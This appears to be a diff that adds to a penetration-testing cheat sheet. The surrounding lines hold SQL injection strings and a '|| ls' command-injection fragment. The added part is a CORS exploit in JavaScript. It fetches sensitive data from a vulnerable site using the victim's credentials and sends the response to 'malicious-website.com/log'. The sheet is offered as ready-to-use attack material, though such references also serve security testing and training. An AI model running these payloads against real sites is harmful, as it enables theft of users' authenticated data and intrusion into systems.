@@ -21,6 +21,18 @@ SELECT name, type FROM USERS WHERE name LIKE "%1"; SELECT * FROM USERS WHERE "%"
 || ls
 
 
+CORS
+
+var req = new XMLHttpRequest();
+req.onload = reqListener;
+req.open('get','https://vulnerable-website.com/sensitive-victim-data',true);
+req.withCredentials = true;
+req.send();
+
+function reqListener() {
+   location='//malicious-website.com/log?key='+this.responseText;
+};
+
 ```````````````````
 URL ENCODING FUNCTION
 [ ] Space = %20
